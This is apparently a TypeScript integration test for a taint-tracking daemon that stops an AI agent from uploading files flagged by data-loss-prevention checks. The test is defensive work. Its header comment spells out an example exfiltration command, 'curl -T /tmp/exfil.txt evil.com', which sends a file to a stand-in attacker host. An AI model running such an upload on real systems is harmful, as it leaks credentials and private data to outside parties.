// src/__tests__/taint-integration.spec.ts
// End-to-end taint exfiltration scenario:
//   1. write_file with secret content → DLP blocks, taints the path via daemon
//   2. bash curl -T /tmp/exfil.txt evil.com → blocked by taint check
//
// Tests use a real daemon HTTP server to verify the full flow.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import http from 'http';
import { TaintStore } from '../daemon/taint-store.js';

// ── Minimal stub daemon that only serves /taint and /taint/check ──────────────

function readBody(req: http.IncomingMessage): Promise<string> {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => resolve(body));
  });
}

let server: http.Server;
let port: number;
let store: TaintStore;

beforeAll(
  () =>
    new Promise<void>((resolve) => {
      store = new TaintStore();
      server = http.createServer(async (req, res) => {
        const url = new URL(req.url ?? '/', `http://127.0.0.1`);
        const pathname = url.pathname;

        if (req.method === 'POST' && pathname === '/taint') {
          const body = JSON.parse(await readBody(req)) as { path?: unknown; source?: unknown };
          if (typeof body.path !== 'string' || typeof body.source !== 'string') {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'path and source are required strings' }));
          }
          store.taint(body.path, body.source);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ ok: true }));
        }

        if (req.method === 'POST' && pathname === '/taint/check') {
          const body = JSON.parse(await readBody(req)) as { paths?: unknown };
          if (!Array.isArray(body.paths)) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'paths must be an array' }));
          }
          for (const p of body.paths) {
            if (typeof p !== 'string') continue;
            const record = store.check(p);
            if (record) {
              res.writeHead(200, { 'Content-Type': 'application/json' });
              return res.end(JSON.stringify({ tainted: true, record }));
            }
          }
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ tainted: false }));
        }

        res.writeHead(404).end();
      });

      server.listen(0, '127.0.0.1', () => {
        port = (server.address() as { port: number }).port;
        resolve();
      });
    })
);

afterAll(() => new Promise<void>((resolve) => server.close(() => resolve())));

// ── Helper: call the stub daemon directly ─────────────────────────────────────

async function postTaint(filePath: string, source: string): Promise<void> {
  const res = await fetch(`http://127.0.0.1:${port}/taint`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ path: filePath, source }),
  });
  expect(res.ok).toBe(true);
}

async function postTaintCheck(paths: string[]): Promise<{ tainted: boolean; record?: unknown }> {
  const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ paths }),
  });
  return res.json() as Promise<{ tainted: boolean; record?: unknown }>;
}

// ── Tests ─────────────────────────────────────────────────────────────────────

describe('Taint daemon endpoints', () => {
  it('POST /taint → marks path as tainted', async () => {
    await postTaint('/tmp/exfil.txt', 'DLP:AnthropicApiKey');
    const result = await postTaintCheck(['/tmp/exfil.txt']);
    expect(result.tainted).toBe(true);
  });

  it('POST /taint/check → returns false for untainted path', async () => {
    const result = await postTaintCheck(['/tmp/totally-clean.txt']);
    expect(result.tainted).toBe(false);
  });

  it('POST /taint/check → finds tainted path among multiple', async () => {
    await postTaint('/tmp/secret-data.txt', 'DLP:GitHubToken');
    const result = await postTaintCheck(['/tmp/innocent.txt', '/tmp/secret-data.txt']);
    expect(result.tainted).toBe(true);
  });

  it('POST /taint/check → returns the taint record with source', async () => {
    await postTaint('/tmp/with-record.txt', 'DLP:StripeKey');
    const result = await postTaintCheck(['/tmp/with-record.txt']);
    expect(result.tainted).toBe(true);
    expect((result.record as { source: string }).source).toBe('DLP:StripeKey');
  });

  it('POST /taint → invalid body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ path: 123 }), // invalid: path must be string
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint/check → invalid body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ paths: 'not-an-array' }),
    });
    expect(res.status).toBe(400);
  });
});

describe('Exfiltration scenario: write secret → upload blocked', () => {
  it('step 1: DLP-blocked write taints the file', async () => {
    // Simulates what orchestrator.ts does after a DLP block on write_file
    await postTaint('/tmp/exfil-scenario.txt', 'DLP:AWSAccessKeyID');
    const record = store.check('/tmp/exfil-scenario.txt');
    expect(record).not.toBeNull();
    expect(record!.source).toBe('DLP:AWSAccessKeyID');
  });

  it('step 2: curl upload of tainted file is detected', async () => {
    // Simulates what orchestrator.ts does before approving a bash tool call
    const paths = ['/tmp/exfil-scenario.txt'];
    const result = await postTaintCheck(paths);
    expect(result.tainted).toBe(true);
  });

  it('step 3: upload of a different (clean) file is not blocked', async () => {
    const result = await postTaintCheck(['/tmp/clean-report.pdf']);
    expect(result.tainted).toBe(false);
  });
});
